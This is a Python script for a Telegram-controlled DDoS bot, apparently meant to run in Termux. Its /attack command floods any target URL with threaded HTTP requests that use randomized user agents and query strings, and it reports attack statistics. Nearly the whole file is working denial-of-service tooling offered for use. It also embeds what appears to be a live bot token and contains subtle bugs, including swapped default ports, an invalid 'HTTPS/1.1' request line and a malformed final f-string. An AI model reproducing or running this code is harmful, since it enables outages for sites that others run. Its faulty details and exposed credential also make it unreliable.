#!/usr/bin/env python3
"""
Telegram DDoS Bot for Termux
Command: /attack <url> <threads> <time>
"""

import asyncio
import threading
import time
import random
import socket
import ssl
import urllib.parse
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============ CONFIGURATION ============
BOT_TOKEN = "8887616845:AAHAZdfiW8Ow-C-zdJ9cqIkUV-LFRc56thA"  # @BotFather se lo
ADMIN_ID = 1674562577# @userinfobot se lo
# =======================================

# Global variables
attack_active = False
attack_threads = []
stop_flag = threading.Event()
request_count = 0
error_count = 0

# Random User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
]

# Attack worker function
def attack_worker(host, port, use_ssl, path):
    global request_count, error_count
    
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            if use_ssl and port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Random parameters
            rand_param = f"?r={random.randint(1000, 999999)}"
            user_agent = random.choice(USER_AGENTS)
            
            payload = (f"GET {path}{rand_param} HTTPS/1.1\r\n"
                      f"Host: {host}\r\n"
                      f"User-Agent: {user_agent}\r\n"
                      f"Accept: */*\r\n"
                      f"Connection: keep-alive\r\n\r\n")
            
            sock.send(payload.encode())
            sock.close()
            
            request_count += 1
            
        except Exception:
            error_count += 1
        
        time.sleep(random.uniform(0.001, 0.01))

# ============ TELEGRAM COMMANDS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - Bot info"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized! Only admin can use this bot.")
        return
    
    await update.message.reply_text(
        "🔥 TERMUX DDoS BOT 🔥\n\n"
        "Commands:\n"
        "▪ /attack <url> <threads> <time> - Start attack\n"
        "▪ /stop - Stop attack\n"
        "▪ /status - Check attack status\n"
        "▪ /help - Show help\n\n"
        "Example:\n"
        "/attack https://example.com 200 30"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack command - Start DDoS"""
    global attack_active, stop_flag, request_count, error_count, attack_threads
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if attack_active:
        await update.message.reply_text("⚠️ Attack already running! Use /stop first.")
        return
    
    # Parse arguments
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Wrong format!\n"
            "Use: /attack <url> <threads> <seconds>\n"
            "Example: /attack https://example.com 100 30"
        )
        return
    
    target_url = args[0]
    try:
        threads = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Threads and seconds must be numbers!")
        return
    
    # Validate URL
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url
    
    # Parse URL
    try:
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "http" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path if parsed.path else "/"
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid URL: {e}")
        return
    
    # Reset counters
    stop_flag.clear()
    request_count = 0
    error_count = 0
    attack_active = True
    attack_threads = []
    
    # Prepare message
    msg = await update.message.reply_text(
        f"🎯 Attack Started!\n\n"
        f"▪ Target: {host}:{port}\n"
        f"▪ Path: {path}\n"
        f"▪ Threads: {threads}\n"
        f"▪ Duration: {duration}s\n"
        f"▪ SSL: {use_ssl}\n\n"
        f"⚡ Attacking... Use /stop to abort."
    )
    
    # Start attack threads
    for i in range(threads):
        t = threading.Thread(target=attack_worker, args=(host, port, use_ssl, path))
        t.daemon = True
        t.start()
        attack_threads.append(t)
    
    # Wait for duration
    start_time = time.time()
    while attack_active and (time.time() - start_time) < duration:
        await asyncio.sleep(1)
        # Update status every 2 seconds
        if int(time.time() - start_time) % 2 == 0:
            try:
                elapsed = int(time.time() - start_time)
                remaining = duration - elapsed
                rps = request_count / elapsed if elapsed > 0 else 0
                await msg.edit_text(
                    f"🎯 Attack in Progress\n\n"
                    f"▪ Target: {host}:{port}\n"
                    f"▪ Time: {elapsed}/{duration}s\n"
                    f"▪ Requests: {request_count}\n"
                    f"▪ Errors: {error_count}\n"
                    f"▪ RPS: {rps:.0f}\n\n"
                    f"⏳ Remaining: {remaining}s"
                )
            except:
                pass
    
    # Stop attack
    stop_flag.set()
    attack_active = False
    
    # Final stats
    elapsed = duration
    rps = request_count / elapsed if elapsed > 0 else 0
    
    await msg.edit_text(
        f"✅ Attack Finished!\n\n"
        f"▪ Target: {host}:{port}\n"
        f"▪ Duration: {elapsed}s\n"
        f"▪ Total Requests: {request_count}\n"
        f"▪ Errors: {error_count}\n"
        f"▪ RPS: {rps:.0f}\n"
        f"▪ Success Rate: {(request_count - error_count) / request_count * 100:.1f}% if {request_count > 0} else 'N/A'"
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop command - Abort attack"""
    global attack_active, stop_flag
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not attack_active:
        await update.message.reply_text("⚠️ No active attack to stop!")
        return
    
    stop_flag.set()
    attack_active = False
    
    await update.message.reply_text("🛑 Attack stopped by user!")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Status command - Check current status"""
    global attack_active, request_count, error_count
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if attack_active:
        await update.message.reply_text(
            f"🔴 Attack Status: ACTIVE\n\n"
            f"▪ Requests sent: {request_count}\n"
            f"▪ Errors: {error_count}"
        )
    else:
        await update.message.reply_text("🟢 Attack Status: IDLE\n\nNo attack running.")